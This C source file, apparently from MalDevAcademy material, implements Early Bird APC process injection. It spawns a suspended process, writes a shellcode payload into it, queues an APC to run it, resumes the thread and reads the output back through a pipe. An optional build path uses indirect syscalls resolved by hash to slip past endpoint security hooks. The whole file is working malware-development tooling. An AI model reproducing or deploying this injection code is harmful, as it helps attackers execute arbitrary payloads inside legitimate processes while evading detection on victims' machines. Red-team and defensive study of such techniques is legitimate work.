// @NUL0x4C | @mrd0x : MalDevAcademy

#include "injection.h"


BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName, PBYTE pPayload, SIZE_T sPayloadSize) {
	DWORD		dwProcessId		= 0;
	PVOID		pAddress		= NULL;
    NTSTATUS	STATUS          = 0;

    HANDLE		hStdOutRead		= NULL,
                hStdOutWrite	= NULL;
    SECURITY_ATTRIBUTES  saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0)){
        DebugPrint("StdoutRd CreatePipe: %d\n", GetLastError());
		return FALSE;
	}

    if (!SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0)) {
        DebugPrint("Stdout SetHandleInformation: %d\n", GetLastError());
        return FALSE;
    }

//	creating target remote process (in debugged state)
	DebugPrint("[i] Creating \"%ls\" Process As A Debugged Process ...\n", szProcessName);

#ifdef HW_INDIRECT_SYSCALL
    NTSTATUS status;
    PROCESS_INFORMATION pi;

    if (!CreateSuspendedProcessWithSyscall(szProcessName, &pi)) {
        DebugPrint("[!] Failed to create process using indirect syscall.\n");
        return FALSE;
    }

    dwProcessId = pi.dwProcessId;
    hProcess = pi.hProcess;
    hThread = pi.hThread;
#else
    if (!CreateSuspendedProcess(szProcessName, &dwProcessId, &hProcess, &hThread, hStdOutWrite, hStdOutWrite)) {
		return FALSE;
	}
#endif

	DebugPrint("[i] Suspended Process Created With Pid : %d \n", dwProcessId);
	DebugPrint("[+] DONE \n\n");


// injecting the payload and getting the base address of it
	DebugPrint("[i] Writing Shellcode To The Target Process ...\n");
	if (!payload_loading(&pAddress, pPayload, sPayloadSize, hProcess, szProcessName)) {
		return FALSE;
	}
	DebugPrint("[+] DONE \n\n");

//	running QueueUserAPC
#ifdef HW_INDIRECT_SYSCALL
    NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)PrepareSyscallHash(NtQueueApcThread_JOAA);
    if ((STATUS = pNtQueueApcThread(hThread, pAddress, NULL, NULL, 0)) != 0) {
        DebugPrint("[!] NtQueueApcThread Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }
    DebugPrint("[+] DONE \n");
#else
    QueueUserAPC((PAPCFUNC)pAddress, hThread, (ULONG_PTR)NULL);
#endif

    DebugPrint("[i] Resuming The Suspended Thread ...\n");
    NtResumeThread_t pNtResumeThread = (NtResumeThread_t)PrepareSyscall((char*)("NtResumeThread"));
    ULONG suspendCount = 0;

#ifdef HW_INDIRECT_SYSCALL
    if ((STATUS = pNtResumeThread(hThread, &suspendCount)) != 0) {
        DebugPrint("[!] NtResumeThread Failed With Error: 0x%0.8X \n", STATUS);
        return FALSE;
    }
#else
    suspendCount = ResumeThread(hThread);
	if (suspendCount == (DWORD)-1) {
		DebugPrint("[!] ResumeThread Failed With Error: %d \n", GetLastError());
		return FALSE;
	}
#endif
    DebugPrint("[+] Thread Resumed Successfully \n\n");

    // Optional: Wait for the injected code to execute
    Sleep(2000);
	DebugPrint("[+] DONE \n\n");

    ReadFromRemotePipe(hStdOutRead);

// Closing the handles to the process and thread
	CloseHandle(hProcess);
	CloseHandle(hThread);
    CloseHandle(hStdOutRead);
    CloseHandle(hStdOutWrite);

	return TRUE;
}